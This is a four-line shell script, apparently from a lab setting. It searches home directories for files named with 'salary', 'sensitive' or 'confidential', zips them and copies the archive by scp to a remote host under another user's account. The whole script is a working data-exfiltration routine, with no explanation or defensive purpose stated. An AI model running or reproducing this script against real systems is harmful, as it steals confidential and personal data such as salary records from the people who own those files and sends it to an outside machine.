file=$( find /home/  \( -name "*salary*" -o -name "*sensitive*" -o -name "*confidential*" \) ! -path "/home/lab301/Desktop/*")
echo $file
zip -r -q sensitive.zip $file
scp sensitive.zip basanta@172.22.168.180:/home/basanta/Desktop/